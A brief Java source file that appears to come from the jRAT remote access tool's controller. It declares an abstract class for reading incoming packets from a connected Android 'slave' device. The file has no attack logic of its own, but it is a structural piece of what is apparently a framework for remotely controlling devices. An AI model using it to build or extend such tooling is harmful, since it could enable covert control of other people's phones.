package io.jrat.client.packets.android.incoming;

import io.jrat.client.android.AndroidSlave;

import java.io.DataInputStream;


public abstract class AbstractIncomingAndroidPacket {

	public abstract void read(AndroidSlave slave, DataInputStream dis) throws Exception;

}
